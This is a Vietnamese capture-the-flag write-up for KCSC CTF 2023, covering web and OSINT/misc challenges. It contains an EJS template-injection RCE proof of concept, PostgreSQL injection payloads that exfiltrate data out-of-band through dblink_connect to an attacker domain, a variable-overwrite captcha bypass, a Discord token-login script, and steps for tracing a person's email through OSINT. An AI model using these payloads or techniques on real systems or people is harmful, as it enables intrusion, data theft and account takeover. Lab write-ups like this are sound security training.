# Tables of Contents
## WEB
### [Bypass Capcha](https://github.com/duypt02/KCSC-CTF-2023/blob/main/README.md#bypass-captcha-web)
### [valentine stolen](https://github.com/duypt02/KCSC-CTF-2023/blob/main/README.md#valentine-stolen--web)
### [Petshop](https://github.com/duypt02/KCSC-CTF-2023/blob/main/README.md#petshop-web)

## MISC
### [Discord check](https://github.com/duypt02/KCSC-CTF-2023/blob/main/README.md#discord-check-misc)
### [Git Gud](https://github.com/duypt02/KCSC-CTF-2023/blob/main/README.md#git-gud-misc)
### [Shackles](https://github.com/duypt02/KCSC-CTF-2023/blob/main/README.md#shackles-misc)
### [Connection](https://github.com/duypt02/KCSC-CTF-2023/blob/main/README.md#connection-misc)

# Bypass Captcha (WEB)
Đây là một bài mà team mình đã giải được trong giải vừa qua sau khi bắt được các tín hiệu vũ trụ từ các bậc tiền bối

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/713a11b4-b200-41e0-a552-65db26000258)

## Description
Khi truy cập vào URL của BTC cung cấp ta nhận được một trang web nhập PASSWORD để unlock flag, hành động được verify bằng capcha của Cloudflare

### Review source code, tìm root-cause
Sau khi ta verify capcha và submit password thì data gửi lên sẽ như sau:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/c387ddbc-d623-4338-b84e-b346040442e2)

Sẽ có 2 param được gửi lên server là password mà ta nhập vào và mã capcha của cloudflare trả về cho client (mã capcha này được đăng ký bởi chủ sở hữu của trang web với cloudflare)

Trên server đoạn code sau sẽ xử lý việc kiểm tra Password và mã capcha
```
<?php
include 'config.php';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $passwd = $_POST['passwd'];
    $response = $_POST['cf-turnstile-response'];
    $ch = curl_init($SITE_VERIFY);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'secret' => $SECRET_KEY,
        'response' => $response
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($data);
    $now = time();
    $challenge_ts = strtotime($data->challenge_ts);
    if ($data->success == 1 && $now - $challenge_ts <= 5) {
        if ($passwd === $PASSWD) {
            die($FLAG);
        } else {
            die('Wrong password!');
        }
    } else {
        die('Verify captcha failed!');
    }
}
?>
```
Ở đây ta thấy rằng đầu tiên server sẽ xác thực capcha của client gửi lên bằng cách gửi secret key của chủ sở hữu trang web và mã capcha của client lên cloudflare

Nếu mã capcha của client là đúng và thời gian từ lúc người dùng xác thực capcha với cloudflare thành công tới lúc server kiểm tra xong mã capcha đó dưới 5s thì sẽ trả về flag

Ta sẽ phân tích thêm một số file code khác được cung cấp từ BTC

File config:
```
<?php
$SITE_VERIFY = getenv('SITE_VERIFY');
$PASSWD = getenv('PASSWD');
$FLAG = getenv('FLAG');
$SITE_KEY = getenv('SITE_KEY');
$SECRET_KEY = getenv('SECRET_KEY');
parse_str($_SERVER['QUERY_STRING']);
echo $_SERVER['QUERY_STRING'];
echo "<br>";
echo $PASSWD;
error_reporting(0);
```

Ở đây chứa các biến được gán giá trị từ việc lấy các giá trị trong các biến môi trường của server, các biến môi trường này ta có thể xem được trong file Docker được BTC cung cấp

Trở lại đoạn code trên ta sẽ đặc biệt chú ý vào biến `$_SERVER['QUERY_STRING']`, đây là một biến GLOBAL trong PHP chứa chuỗi truy vấn của URL hiện tại, ví dụ: trong URL `https://bypass-captcha.kcsc.tf/index.php?passwd=123&test=kcsc`, truy vấn của URL là `passwd=123&test=kcsc`. Trong trường hợp này, `$_SERVER['QUERY_STRING']` sẽ chứa giá trị `"passwd=123&test=kcsc"`

Sau khi qua hàm `parse_str()` nó sẽ phân tích truy vấn của URL để trích xuất các tham số và giá trị riêng lẻ, ví dụ: 
```
parse_str("passwd=123&test=kcsc")
echo $passwd;
//123
echo $test
//kcsc
```
-> Vậy từ công dụng của `parse_str($_SERVER['QUERY_STRING'])` ta có thể nhận thấy rằng các biến bên trên có thể bị ghi đè 

## Solution
Sau khi có ý tưởng ghi đè các biến bên trên bằng `QUERY_STRING` thì ta có giải quyết bài này bằng cách sau:
+ C1: Ghi đè biến `PASSWD` và nhanh tay gửi capcha tới server sao cho thời gian <5s

+ C2: Ta sẽ ghi đè `PASSWD` và ghi đè `SITE_VERIFY` (do ta có thể kiểm soát được kết quả trả về)

Trong giải này team mình làm theo cách 1:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b5f2bfbc-e359-49ab-9eaa-cd5c71325546)

Flag: `KCSC{Bypass_Turnstile_Cloudflare_1e22c0f8}`

# valentine (stolen)  (WEB)
![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/95d4588f-ebcf-4cce-a42d-e8ab20db09e8)

## Description
Bài này trong giải vừa qua mình đã không giải được do kiến thức về SSTI còn quá gaf, sau khi giải kết thúc được người ae 5h4s1 cùng lớp hint là có một bài write-up khác có thể áp dụng để giải thì mình đã áp dụng  thành công

Link WU: https://hxp.io/blog/101/hxp-CTF-2022-valentine/

Đầu tiên khi vào Challenge BTC cung cấp cho một file chứa toàn bộ Source code và file Docker

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/7b3a9622-c578-4f29-9dbe-7a0eb66570a3)

File flag nằm ở ngoài web root + WU liên quan tới SSTI nên chắc chắn ta sẽ phải RCE để đọc flag (đọc thông qua việc thực thi file readFlag)

Mình custom lại PoC của WU, hiểu nôm na là họ sẽ sử dụng kỹ thuật `SSTI using EJS custom delimiters` 

```
import requests
import re

HOST = 'https://valentine.kcsc.tf'

r = requests.post(f"{HOST}/template", data={"tmpl":"""{{ name }} <.= global.process.mainModule.require('child_process').execSync('/readflag') .>"""}, allow_redirects=False)

m = re.search(r"/(?P<uuid>.*)?name=", r.text)
r = requests.get(f"{HOST}{m.group(0)}&delimiter=.")
m = re.search(r"KCSC\{[^}]+\}", r.text)
print(m.group(0))
```
EJS custom delimiters sẽ được sử dụng để định nghĩa một delimiter mới, trong bài này sử dụng delimiter mặc định là `%`

* Note: Do trong bài có kiểm tra template gửi lên có chứa `{{name}}` hay không nên ta sẽ phải thêm chuỗi này vào template

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/9fb5f140-93b8-4b31-b4fd-62cd3d3940e3)

Chạy PoC ta được Flag:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/fd5e1a20-1085-4967-9fa6-7dbec5b7852a)

### Sau khi một số team public WU thì mình có biết thêm 1 cách dễ hiểu hơn

Do challenge không filter `{{` và `}}` mà chỉ chuyển nó sang dạng `<%=` và `%>`mà 2 dang này vẫn có thể thực thi code bình thường. Do đó ta có thể chèn 2 chuỗi template trong cùng 1 lần gửi lên

`{{ name }} 
{{ process.mainModule.require('child_process').execSync('/readflag').toString() }}`

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/48742e30-c445-4a74-9725-ebab2359032c)

Kết quả:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b6ea3536-8809-4dea-ae51-c6403ad2fc2b)

Flag: `KCSC{https://www.youtube.com/watch?v=A5OLaBlQP9I}`

# Petshop (WEB)
![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/570e8b9a-4602-46bd-bdbb-82fe558ef121)

## Description
Chall cung cấp một URL dẫn tới một trang web bán thú cưng
![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/e780f3a8-e2b2-410c-b8d3-81ed38958302)

Ở đây có một chức năng tìm kiếm đã bị disible, ta sẽ enable chức năng này bằng dev tool 

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/d741cc1d-6c6e-4b25-9e7c-3edce2ee8984)

Sau khi nhập input và ấn gửi, dữ liệu sẽ được truyền lên param `sp`. Ở đây có xuất hiện lỗi SQL Injection, nhưng có đặc điểm là kết quả của câu truy vấn sẽ được trả về sau khi reload lại trang thêm 1 lần

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/eb6133d8-3e01-474f-8ce3-9d59345a99c3)

Do ở description chall có từ khóa cá voi nên có thể suy ra db đang sử dụng là PostgreSQL (logo hình cá voi)

Sử dụng kỹ thuật OOB PostgreSQL bằng dblink_connect:
Payload: 
```?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT tablename from pg_tables limit 1) , '.[YOUR_DOMAIN] user=a password=a '))--```
Thực hiện dump table `searches` do còn lại là table default của database:

Dump tên cột
```?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT column_name from information_schema.columns where table_name = 'searches' limit 1 offset 0) , '.[YOUR_DOMAIN] user=a password=a '```

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/537a95e7-ccdc-4f5e-a417-b8e033641672)

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/fb079110-571b-48d1-88fb-f818bd69f3ab)

Có hai column là `id` và `search`

Thực hiện dump data từ search
Payload lấy data từ column search: 
```?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT substring(search,1,51) from searches) , '.[YOUR_DOMAIN] user=a password=a '))-- -```

Kết quả:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/e171ed13-88f4-4cf9-9a4e-7274d683e2b8)

Ta thu được một đoạn data được decode base64, thực hiện decode được:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/a90ebcf1-23f8-4e40-bddf-b909fca5cfd3)

`/var/lib/postgresql/data/sqlOutOfBand` : Đây là file binary, thực hiện chạy file này bằng `pg_read_binary_file`

Payload:

`?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT pg_read_binary_file ('/var/lib/postgresql/data/sqlOutOfBand')) , '.[YOUR_DOMAIN] user=a password=a '))-- -`

Kết quả:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/f6851a48-9b2a-47cc-be59-b77ef82e7345)

Thực hiện convert đoạn hexa này sang text:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b01c509b-f065-453f-a520-8166703d937e)

Flag: `KCSC{Yeah_Ban_Lam_Duoc_Roi!!!}`

# Discord check (MISC)

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/14a1f85c-5ec3-49b9-914d-5952dcd8cfcd)

Bài này ta chỉ cần vào Discord của giải để lấy flag

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/f3a12125-fcfc-4500-95f6-e1b9cff2f677)

# Git Gud (MISC)

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/da234ce1-0360-4acf-8539-f9a979c7fed0)

## Description
Challenge cung cấp một folder đã zip, thực hiện unzip thu được folder `.git`, thường dạng bài này ta sẽ xem log của nó sẽ thu được những thông tin có ích 

## Solution
Thực hiện xem log của git bằng command `git log`

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/d2087858-e37e-49a4-94ab-ad3c7d918e31)

Sau khi xem log thì ta thấy có rất nhiều sửa đổi ở đây, thực hiện khôi phục lại bằng lệnh `git checkout`

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/129ed031-e96f-40d5-ba0c-88e20cc82f7e)

Khôi phục được 1 file ảnh:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/8763c8b0-ac9c-42b3-ad3c-523e1330fd69)

Flag: `KCSC{G1t_h1st0Ry_d1v1n9}`

# Shackles (MISC)

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/bbe7769f-cd97-4c71-9835-202a1b88478e)

## Description
Bài này yêu cầu ta phải tìm một người có tên `justatree781 ` sau đó truy cập vào tài khoản người này

### Solution
Trên Twitter ta tìm được một user có tên giống như username đã được cung cấp

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/9248d9ab-72b4-445d-a4b9-6cd23584cc80)

Người này có một tweet kèm theo một đường link, thực hiện truy cập vào:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/511d14f2-7a87-463a-8b74-9aca16c4b255)

Ở đây có một list thông tin nhưng không có cái nào có thể dùng được, nhưng từ URL ta có thể truy cập vào profile trên github gist của người này 

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/6a317e06-6e50-4068-b499-f9d7e1bf234a)

Trên profile có gán một link pastebin, nhưng truy cập vào sẽ không thu được gì

Truy cập vào gist `Get hidden channel information using access token`, nhưng ta sẽ không view raw mà chỉ xem bình thường

`https://gist.github.com/truongangok/680ebf037a08d7dfe2ef0bf3da41d9d3/`

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/aa1f9069-a0d9-4e3a-95a6-6935ba025481)

Ở đây ta xem được comment giữa author và truongangok (người đang đi tìm). Từ đây ta tìm được một đoạn Token discord, thực hiện login vào. 
Script login được người đồng đội mình tìm được:

```
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}

login('PASTE TOKEN HERE')
```

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/3f6eec04-e318-495f-87e1-be422807cb54)

Do hôm nay mình log thì token đã die nên không log vào được

Sau khi login, flag chính là tên người dùng discord, thực hiện decode base64 sẽ thu được flag

# Connection (MISC)
![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/69cc618c-755d-41d1-8227-3a61a311716d)

Bài này sau khi end giải, nhận được hint thì mình thử làm lại
## Description
Challenge yêu cầu tìm một người có tên `justinccase2511`

## Solution 
Vào [WhatsMyName](https://whatsmyname.app/) để tìm các thông tin liên quan đến username `justinccase2511`

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/00c93b84-166b-4fbb-8377-e67ade382ecb)

Ta nhận được một trang twitter capture bởi Wayback Machine, truy cập vào kết quả tìm kiếm:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/1a08f455-da26-48b0-8641-01d018754b74)

Do username trên twitter đã đổi nhưng ID của tài khoản không thay đổi nên ta có thể tìm username hiện tại bằng ID lấy từ usernamw cũ trên bản twitter capture

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/3c89f9cf-2735-4465-8663-97b395fc99e7)

Convert:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/0435aee8-6601-4bf1-8b95-ee5f3efd6345)

Truy cập profile user vừa tìm ra

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/cedf5f20-98b4-4d02-a784-7b3209f6d599)

Người này có một tweet chứa một link dẫn tới google sheet:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/a3bd37e5-3d32-430c-858b-380b61a35289)

Để lấy được mail của owner ta sẽ thêm lối tắt sheet này vào drive, tại driver ta sẽ xem được mail:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/9c974a25-fda1-42f4-a8be-29a1b478d7ed)

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b0f20b4d-d842-4ab2-b85a-da93a0d880c0)

Từ mail ta tìm được user trên tumblr

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/5530590d-acd8-44ea-bf85-4f922d976f08)

Sửa một chút css để xem avatar:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/9718f32b-2edf-4acb-8e60-356f97183c6d)

Flag: `KCSC{3m4iL_t0_TumbRL???_1b8ad0}`
